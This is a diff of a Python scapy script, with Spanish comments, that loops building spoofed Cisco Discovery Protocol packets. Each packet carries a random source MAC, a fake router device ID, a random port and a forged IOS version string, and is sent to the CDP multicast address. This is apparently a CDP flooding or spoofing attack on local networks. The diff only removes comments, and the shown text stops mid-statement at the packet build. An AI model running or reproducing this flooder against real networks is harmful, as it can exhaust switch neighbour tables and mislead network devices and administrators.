@@ -4,7 +4,7 @@ import time
 import struct
 from scapy.all import *
 
-# --- CONFIGURACIÓN ---
+
 interface = "eth0"
 # ---------------------
 
@@ -15,7 +15,7 @@ def crear_tlv(tipo, valor):
     if isinstance(valor, str):
         val_bytes = valor.encode('utf-8')
     else:
-        val_bytes = valor # Si ya son bytes, los dejamos igual
+        val_bytes = valor 
         
     length = 4 + len(val_bytes)
     return struct.pack("!HH", tipo, length) + val_bytes
@@ -27,13 +27,12 @@ print("[*] Presiona Ctrl+C para detener.")
 try:
     packet_count = 0
     while True:
-        # 1. Datos aleatorios
+      
         mac_src = RandMAC()
         device_id = f"Router_Falso_{RandNum(100, 999)}"
         port_id = f"Ethernet{RandNum(0, 3)}/{RandNum(0, 3)}"
         
-        # 2. Construcción MANUAL del Payload
-        # Cabecera CDP: Versión (2) + TTL (180s) + Checksum (0)
+    
         cdp_header = b'\x02\xb4\x00\x00'
         
         # TLVs
@@ -46,15 +45,13 @@ try:
         # Software Version (0x0005)
         tlv_soft = crear_tlv(0x0005, "Cisco IOS Software (I86BI_LINUX-L3-M)")
         
-        # --- LA PIEZA FALTANTE: CAPABILITIES (0x0004) ---
-        # 4 bytes de flags. El bit final (0x01) significa "Soy un Router".
-        # Formato binario: 00 00 00 01
+    
         tlv_cap = crear_tlv(0x0004, b'\x00\x00\x00\x01')
 
         # Unimos todo
         payload_cdp = cdp_header + tlv_device + tlv_port + tlv_cap + tlv_platform + tlv_soft
 
-        # 3. Enviar
+     
         packet = Ether(src=mac_src, dst="01:00:0c:cc:cc:cc") / \
                  LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
                  SNAP(OUI=0x00000c, code=0x2000) / \
